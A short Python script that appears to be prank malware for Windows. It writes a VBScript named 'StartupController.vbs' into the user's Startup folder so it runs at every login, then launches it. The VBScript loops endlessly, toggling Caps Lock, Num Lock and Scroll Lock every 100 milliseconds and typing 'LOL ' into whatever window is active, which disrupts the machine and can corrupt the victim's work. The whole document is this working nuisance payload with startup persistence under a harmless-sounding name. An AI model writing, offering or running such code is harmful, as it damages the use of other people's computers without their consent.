import getpass
import os

username = getpass.getuser()
startupdir = f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
filename = "StartupController.vbs"
with open(f"{startupdir}/{filename}", "w") as file:
	file.write("set output=wscript.createobject (\"wscript.shell\")\n")
	file.write("do\n")
	file.write("wscript.sleep 100\n")
	file.write("output.sendkeys \"{CAPSLOCK}\"\n")
	file.write("output.sendkeys \"{NUMLOCK}\"\n")
	file.write("output.sendkeys \"{SCROLLLOCK}\"\n")
	file.write("output.sendkeys \"LOL \"\n")
	file.write("loop")

cwd = os.getcwd()
os.chdir(startupdir)
os.system(filename)
os.chdir(cwd)